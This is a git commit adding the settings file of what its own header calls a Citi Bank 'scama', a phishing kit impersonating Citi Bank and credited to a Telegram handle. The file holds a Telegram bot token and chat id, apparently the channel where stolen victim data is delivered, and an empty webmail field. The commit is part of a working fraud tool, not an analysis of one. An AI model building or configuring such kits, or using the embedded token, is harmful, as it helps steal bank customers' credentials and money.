6505cb09d0b73cbf59fd14f3d22517d426a90a70
Hacka876 <100975062+Hacka876@users.noreply.github.com>
2022-06-05 04:37:01 +0800

    Add files via upload

---
+++ new citi/index/admin/settings.php
@@ -0,0 +1,17 @@
+<?php
+/**
+ * This is Citi Bank Scama By @Yun_sun On tg...
+ * @author @Yun_sun
+ * @version 1.0
+ * @right's don't share / sell without permisson
+
+ 
+*@   this settings file is for setting of whole scama
+
+*/
+
+
+$token ="1999701536:AAGChvDDcdk6jCvYB4I8jXYkttJvxSfgXG0";
+$id =1861669283;
+$webmail = "";
+
